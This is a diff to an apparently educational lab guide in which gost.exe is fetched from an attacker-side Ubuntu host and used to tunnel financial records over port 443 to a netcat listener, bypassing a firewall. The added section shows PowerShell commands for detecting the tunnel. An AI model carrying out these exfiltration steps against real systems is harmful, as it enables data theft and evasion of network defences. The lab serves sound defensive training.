@@ -135,6 +135,13 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\go
 ```
 <img width="1199" height="96" alt="image" src="https://github.com/user-attachments/assets/244e1e26-f48c-49db-8ff8-1488fa032e30" />
 
+<br></br>
+
+>[!IMPORTANT]
+> **Do NOT close this terminal until the end of the lab**. We'll use it in the **Blue Team Detection** segment. 
+
+<br></br>
+
 - Open a *NEW* PowerShell terminal. We will now push the sensitive financial records straight into the local end of the tunnel. 
 
 ```powershell
@@ -152,9 +159,10 @@ You will now see a **Connection recieved** message in the Ubuntu Terminal.
 
 <img width="805" height="307" alt="image" src="https://github.com/user-attachments/assets/a0045e4b-f4f0-48f5-9ab0-345d24c91110" />
 
+
 ---
 
-### Phase 4: Verification (Ubuntu VM)
+### Phase 4: Verification
 Let's see if the firewall was bypassed successfully.
 
 - Go back to your Ubuntu VM, specifically to *Terminal 2* (where Netcat was running). The listener should automatically stop once the information is recieved. When it does, read the stolen data.
@@ -166,21 +174,27 @@ cat exfiltrated_data.csv
 
 ---
 
-### Phase 5: Blue Team Detection (Windows VM)
+### Phase 5: Blue Team Detection
+
 Why didn't the enterprise firewall block this? Because the traffic looked like a normal encrypted web connection (HTTPS/443). How can we detect it as defenders?
 
-- Switch back to the Windows VM. Look for suspicious persistent connections. Although the traffic is encrypted, the process maintaining the connection is anomalous. 
+Open a NEW PowerShell terminal as Administrator. We will perform a Live Response on the machine to find the hidden tunnel.
 
-```powershell
-netstat -ano | findstr 443
+- Find anomalous network connections.
+Instead of standard netstat, we will use PowerShell cmdlets to specifically look for established external connections on port 443.
+
+
+```PowerShell
+Get-NetTCPConnection -RemotePort 443 -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
 ```
-<img width="769" height="274" alt="image" src="https://github.com/user-attachments/assets/2f023e8c-23f1-43f6-a8f1-d1898495dce9" />
 
-- Match the PID (Process ID) from the previous command to the actual executable. (Replace <PID> with the number from the last column of your netstat output).
+[Screenshot: Output-ul comenzii, arătând clar IP-ul de Ubuntu la RemoteAddress, portul 443 și numărul OwningProcess (PID)]
 
-```powershell
-Get-Process -Id <PID>
+- Identify the process owning the connection: Take the OwningProcess ID (PID) from the previous command and let's see what program is actually communicating with the outside world. (Replace <PID> with your specific number).
+
+```PowerShell
+Get-Process -Id <PID> | Select-Object Name, Path, Description
 ```
-<img width="733" height="130" alt="image" src="https://github.com/user-attachments/assets/3f5414a8-36b6-4303-88c5-b96ffbc6fe0e" />
+[Screenshot: Output-ul arătând Name: "gost", Path: "C:\Users\Administrator\AppData\Local\Temp\gost.exe"]
 
 
